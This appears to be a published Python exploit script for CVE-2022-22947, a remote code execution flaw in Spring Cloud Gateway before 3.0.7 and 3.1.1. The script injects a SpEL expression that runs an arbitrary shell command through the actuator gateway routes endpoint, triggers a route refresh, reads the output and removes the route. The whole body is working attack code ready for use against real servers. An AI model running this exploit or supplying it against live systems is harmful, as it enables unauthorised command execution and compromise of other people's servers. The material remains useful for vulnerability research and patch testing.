# Exploit Title: Spring Cloud Gateway 3.1.0 - Remote Code Execution (RCE)
# Google Dork: N/A
# Date: 03/03/2022
# Exploit Author: Carlos E. Vieira
# Vendor Homepage: https://spring.io/
# Software Link: https://spring.io/projects/spring-cloud-gateway
# Version: This vulnerability affect Spring Cloud Gateway < 3.0.7 & < 3.1.1
# Tested on: 3.1.0
# CVE : CVE-2022-22947

from misc.session import *

import random
import string
import requests
import json
import base64

headers = { "Content-Type": "application/json" , 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36','Accept' : '*/*'}

#proxies = {
#    'http': 'http://172.29.32.1:8081',
#    'https': 'http://172.29.32.1:8081',
#}

def clean(url, id):
    requests.delete(url + '/actuator/gateway/routes/' + id, headers=headers, verify=False)

def springcloudgateway(url, command, session):
    try:
        id = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
        payload = { "id": id, "filters": [{ "name": "AddResponseHeader", "args": { "name": "Result", "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\u0022"+command+"\u0022).getInputStream()))}"}}],"uri": "http://example.com"}
        commandb64 = base64.b64encode(command.encode('utf-8')).decode('utf-8')

        rbase = session.post(url + '/actuator/gateway/routes/'+id, headers=headers, data=json.dumps(payload), verify=False)
        if(rbase.status_code == 201):
            r = session.post(url + '/actuator/gateway/refresh', headers=headers, verify=False)
            if(r.status_code == 200):
                r = session.get(url + '/actuator/gateway/routes/' + id, headers=headers, verify=False)
                if(r.status_code == 200):
                    return True
                else:
                    clean(url, id)
                    return False
            else:
                clean(url, id)
                return False
    except Exception as e:
        return (False, e)